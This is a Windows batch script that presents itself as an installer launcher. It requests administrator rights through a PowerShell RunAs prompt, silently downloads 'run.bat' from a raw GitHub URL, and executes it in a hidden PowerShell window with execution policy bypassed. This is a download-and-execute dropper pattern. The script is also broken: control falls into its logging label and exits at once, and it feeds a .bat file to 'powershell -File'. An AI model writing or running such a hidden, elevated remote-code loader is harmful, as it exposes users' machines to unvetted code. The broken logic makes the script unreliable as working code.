@echo off
setlocal enabledelayedexpansion

:: Define temporary log file path
set "LOG_FILE=%TEMP%\debug_log_%RANDOM%.txt"

:: Function to log messages
:LogMessage
echo [%DATE% %TIME%] %* >> "%LOG_FILE%"
exit /b

:: Check if the script is running with administrative privileges
openfiles >nul 2>&1
if %errorlevel% NEQ 0 (
    :: Prompt for administrative privileges
    call :LogMessage Script running without administrative privileges. Attempting to elevate...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs"
    exit /b
) else (
    call :LogMessage Script running with administrative privileges.
)

:: Download the installer from a remote location silently
call :LogMessage Downloading installer from remote location...
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/angeborrelli/files/main/run.bat', '%~dp0run.bat')"
if %errorlevel% NEQ 0 (
    call :LogMessage Failed to download installer from remote location.
    exit /b
) else (
    call :LogMessage Installer downloaded successfully.
)

:: Run the PowerShell script silently
call :LogMessage Running PowerShell script silently...
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0run.bat"
if %errorlevel% NEQ 0 (
    call :LogMessage Failed to run PowerShell script.
) else (
    call :LogMessage PowerShell script executed successfully.
)

:: Display completion message
call :LogMessage Script execution completed.

:: Pause to view log (optional)
pause
exit /b
